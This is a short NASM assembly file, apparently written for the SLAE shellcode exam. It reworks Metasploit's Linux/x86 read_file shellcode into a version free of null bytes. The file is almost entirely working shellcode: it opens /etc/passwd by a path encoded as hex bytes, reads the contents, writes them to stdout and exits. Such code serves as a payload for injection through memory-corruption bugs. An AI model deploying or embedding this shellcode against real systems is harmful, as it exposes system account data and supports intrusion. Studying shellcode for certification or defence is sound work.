; Filename: metasploit_read_passwd.nasm
; Author: Ray Doyle (@doylersec)
; Website: https://www.doyler.net
;
; Purpose: SLAE Exam Assignment #5 - Metasploit read_file shellcode (Linux/x86) for /etc/passwd with no null bytes

global _start 

section .text

_start:
   jmp short call_shellcode

shellcode:
   ;mov eax,0x5
   xor eax,eax
   mov al,0x5
   pop ebx
   xor ecx,ecx
   int 0x80
   mov ebx,eax
   ;mov eax,0x3
   mov al,0x3
   mov edi,esp
   mov ecx,edi
   ;mov edx,0x1000
   xor edx,edx
   mov dh,0x10
   int 0x80
   mov edx,eax
   ;mov eax,0x4
   xor eax,eax
   mov al,0x4
   ;mov ebx,0x1
   xor ebx,ebx
   mov bl,0x1
   int 0x80
   ;mov eax,0x1
   xor eax,eax
   mov al,0x1
   ;mov ebx,0x0
   xor ebx,ebx
   int 0x80

call_shellcode:
   call shellcode
   message: db 0x2F, 0x65, 0x74, 0x63, 0x2F, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64